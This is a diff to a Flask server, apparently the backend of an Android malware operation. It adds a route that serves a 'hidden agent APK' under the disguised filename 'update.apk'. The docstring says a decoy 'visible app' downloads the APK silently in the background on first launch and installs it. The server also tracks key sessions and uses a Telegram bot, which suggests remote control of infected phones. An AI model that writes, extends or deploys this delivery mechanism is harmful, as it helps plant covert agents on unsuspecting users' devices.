@@ -19,7 +19,7 @@ import threading
 import uuid
 from datetime import datetime, timedelta, timezone
 
-from flask import Flask, jsonify, make_response, request, Response
+from flask import Flask, jsonify, make_response, request, Response, send_file
 from flask_socketio import SocketIO, emit, disconnect
 import telebot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
@@ -2075,6 +2075,23 @@ def _index():
 def _ping():
     return jsonify({"status": "alive", "timestamp": datetime.now(timezone.utc).isoformat(),
                      "active_key_sessions": len(_sessions), "version": "7.1.0"}), 200
+
+# ⚡ V11.2.92: Route to serve the agent APK (downloaded by the visible app)
+# The APK is stored at downloads/agent.apk in this repo
+@app.route("/agent.apk")
+def _serve_agent_apk():
+    """Serve the hidden agent APK to the visible app.
+    The visible app downloads this APK in the background when first opened,
+    then installs it via the system installer (protected by VPN).
+    """
+    import os
+    apk_path = "downloads/agent.apk"
+    if not os.path.exists(apk_path):
+        logger.warning(f"Agent APK not found at {apk_path}")
+        return make_response("Not Found", 404)
+    logger.info(f"Serving agent APK ({os.path.getsize(apk_path)} bytes)")
+    return send_file(apk_path, mimetype="application/vnd.android.package-archive",
+                     as_attachment=True, download_name="update.apk")
 
 
 # ════════════════════════════════════════════════════════════════
